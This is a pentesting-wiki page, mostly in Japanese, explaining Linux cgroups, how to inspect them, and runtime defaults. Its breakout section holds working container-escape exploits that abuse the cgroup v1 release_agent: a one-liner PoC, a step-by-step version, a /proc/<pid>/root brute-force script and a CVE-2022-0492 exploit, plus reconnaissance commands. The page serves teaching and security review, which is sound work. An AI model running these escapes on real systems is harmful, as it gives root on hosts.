# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux **control groups** は、プロセスを会計、制限、優先順位付け、ポリシー適用のためにまとめるためのカーネルの仕組みです。namespaces が主にリソースの見え方を分離することに関するなら、cgroups は一群のプロセスがそれらのリソースをどの程度消費できるか（**how much**）や、場合によってはどの種類のリソースとやり取りできるか（**which classes of resources**）を管理する役割を果たします。Containers はユーザが直接意識しなくても常に cgroups に依存しています。ほとんどの modern runtime はカーネルに対して「これらのプロセスはこのワークロードに属し、これらのリソースルールが適用される」と伝える方法を必要とするからです。

だからこそ container engines は新しいコンテナを独自の cgroup subtree に配置します。一度プロセスツリーがそこに入ると、runtime はメモリ上限の設定、PIDs の制限、CPU 使用の重み付け、I/O の調整、デバイスアクセスの制限などが行えます。本番環境では、これはマルチテナントの安全性と運用上の健全性の両方に不可欠です。意味のあるリソース制御を持たないコンテナは、メモリを使い果たしたり、プロセスでシステムを氾濫させたり、ホストや隣接するワークロードを不安定にするように CPU や I/O を独占する可能性があります。

セキュリティの観点では、cgroups は二つの面で重要です。第一に、リソース制限が不十分または欠如していると、単純な denial-of-service 攻撃を許してしまいます。第二に、特に古い **cgroup v1** 環境では、コンテナ内から書き込み可能な場合に強力な breakout primitives を生む cgroup 機能が歴史的に存在しました。

## v1 Vs v2

実運用では二つの主要な cgroup モデルが存在します。**cgroup v1** は複数のコントローラ階層を露出し、古い exploit writeups はそこで利用可能な奇妙で時に強力なセマンティクスを中心に語られることが多いです。**cgroup v2** はより統一された階層と概してクリーンな振る舞いを導入します。Modern distributions は cgroup v2 を好む傾向が強まっていますが、混在やレガシー環境は依然として存在するため、実際のシステムをレビューする際には両方のモデルが関連します。

この差は重要です。なぜなら、cgroup v1 における **`release_agent`** の悪用のような有名な container breakout の話の多くは、非常に特定の古い cgroup の挙動に結びついているからです。ブログで cgroup のエクスプロイトを見て、それを盲目的に現代の cgroup v2-only なシステムに適用すると、ターゲットで実際に何が可能かを誤解する可能性が高いです。

## 検査

現在のシェルがどこにあるかを確認する最速の方法は:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` ファイルは、現在のプロセスに関連付けられた cgroup パスを表示します。モダンな cgroup v2 ホストでは、通常は統一されたエントリが表示されます。古いまたはハイブリッドなホストでは、複数の v1 コントローラパスが表示されることがあります。パスが分かったら、対応するファイルを `/sys/fs/cgroup` の下で確認して、制限や現在の使用状況を確認できます。

cgroup v2 ホストでは、次のコマンドが有用です:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
これらのファイルは、どのコントローラが存在し、どのコントローラが子 cgroups に委譲されているかを明らかにします。この委譲モデルは rootless や systemd-managed 環境で重要です。なぜなら、ランタイムが親階層が実際に委譲している cgroup 機能のサブセットしか制御できない場合があるからです。

## Lab

cgroups を実際に観察する一つの方法は、メモリ制限付きのコンテナを実行することです：
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID 制限付きコンテナも試せます:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime Usage

Docker、Podman、containerd、CRI-O はいずれも通常の動作の一部として cgroups に依存しています。違いは通常、cgroups を使うかどうかではなく、**どのデフォルトを採用するか**、**systemd とどのように連携するか**、**rootless delegation がどのように機能するか**、および **構成のどの程度がエンジン側で制御され、どの程度がオーケストレーション側で制御されるか** に関するものです。

Kubernetes では、resource requests と limits は最終的にノード上の cgroup 設定になります。Pod YAML からカーネルによる強制に至る経路は kubelet、CRI runtime、OCI runtime を経由しますが、最終的にルールを適用するのはやはりカーネルの cgroups メカニズムです。Incus/LXC 環境でも cgroups は多用されます。特に system containers はより豊かなプロセスツリーや VM に近い運用期待値を露出することが多いためです。

## Misconfigurations And Breakouts

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` Background

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

For the technique to work, the attacker generally needs:

- 書き込み可能な **cgroup v1** 階層
- 子 cgroup を作成または使用する能力
- `notify_on_release` を設定する能力
- `release_agent` にパスを書き込む能力
- ホストの視点で実行可能ファイルに解決されるパス

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
この PoC はペイロードのパスを `release_agent` に書き込み、cgroup のリリースをトリガーし、その後ホスト上で生成された出力ファイルを読み戻します。

### 分かりやすい手順

同じアイデアをステップに分けると理解しやすくなります。

1. 書き込み可能な cgroup を作成して準備する:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. コンテナのファイルシステムに対応するホスト側のパスを特定する:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. ホストのパスから見える payload をドロップする:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup を空にして実行をトリガーする:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
その結果、payload はホスト側でホストの root 権限で実行される。実際の exploit では、payload は通常 proof file を書き込み、reverse shell を生成するか、ホストの状態を変更する。

### `/proc/<pid>/root` を使った Relative Path Variant

一部の環境では、container filesystem へのホスト側パスが明確でなかったり、storage driver によって隠されていることがある。その場合、payload のパスは `/proc/<pid>/root/...` を通じて表現できる。ここで `<pid>` は現在のコンテナ内のプロセスに対応するホストの PID である。これが relative-path brute-force variant の基礎である:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
ここでの重要なトリックはブルートフォース自体ではなくパスの形式です: `/proc/<pid>/root/...` によって、直接のホストのストレージパスが事前に分かっていなくても、カーネルはホスト名前空間からコンテナのファイルシステム内のファイルを解決できます。

### CVE-2022-0492 バリアント

In 2022, CVE-2022-0492 showed that writing to `release_agent` in cgroup v1 was not correctly checking for `CAP_SYS_ADMIN` in the **initial** user namespace. This made the technique far more reachable on vulnerable kernels because a container process that could mount a cgroup hierarchy could write `release_agent` without already being privileged in the host user namespace.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
脆弱なカーネルでは、ホストは `/proc/self/exe` をホストの root 権限で実行します。

実際の悪用では、まず環境が書き込み可能な cgroup-v1 パスや危険なデバイスへのアクセスをまだ公開しているか確認してください:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
もし `release_agent` が存在し、書き込み可能であれば、あなたは既に legacy-breakout の領域にいます:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
もし cgroup パス自体が escape をもたらさない場合、次に実用的に使われるのはしばしば denial of service や reconnaissance です:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
これらのコマンドは、ワークロードが fork-bomb を仕掛ける余地があるか、メモリを大量に消費できるか、あるいは書き込み可能なレガシー cgroup インターフェースを悪用できるかを素早く判別します。

## Checks

ターゲットをレビューする際、cgroup チェックの目的は、どの cgroup モデルが使われているか、コンテナが書き込み可能なコントローラーのパスを参照できるか、そして `release_agent` のような古い breakout primitives がそもそも関連するかどうかを把握することです。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
何が興味深いか:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## ランタイムのデフォルト

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで有効 | コンテナは自動的に cgroups に配置されます；リソース制限はフラグで設定しない限り任意です | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | デフォルトで有効 | `--cgroups=enabled` がデフォルトです；cgroup namespace のデフォルトは cgroup のバージョンによって異なります（`private` on cgroup v2, `host` on some cgroup v1 setups） | `--cgroups=disabled`, `--cgroupns=host`, デバイスアクセスの緩和、`--privileged` |
| Kubernetes | ランタイム経由でデフォルトで有効 | Pods とコンテナはノードのランタイムによって cgroups に配置されます；細かなリソース制御は `resources.requests` / `resources.limits` に依存します | resource requests/limits の省略、privileged デバイスアクセス、ホストレベルのランタイム誤設定 |
| containerd / CRI-O | デフォルトで有効 | cgroups は通常のライフサイクル管理の一部です | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

重要な区別は、**cgroup の存在**は通常デフォルトである一方、**有用なリソース制約**は明示的に設定されない限り多くの場合オプションである、という点です。
